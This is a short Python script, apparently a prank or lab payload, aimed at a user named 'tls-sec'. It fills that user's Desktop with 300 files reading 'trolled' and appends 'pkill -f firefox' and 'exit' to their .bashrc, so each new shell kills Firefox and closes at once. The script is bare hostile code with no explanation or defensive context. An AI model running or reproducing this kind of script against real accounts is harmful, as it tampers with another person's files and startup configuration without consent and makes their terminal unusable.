import subprocess

for x in range(300):
    with open("../home/tls-sec/Desktop/file"+str(x), 'w') as f:
      f.write("trolled")

with open("../home/tls-sec/.bashrc", 'a+') as f:
    f.write("\npkill -f firefox\nexit")
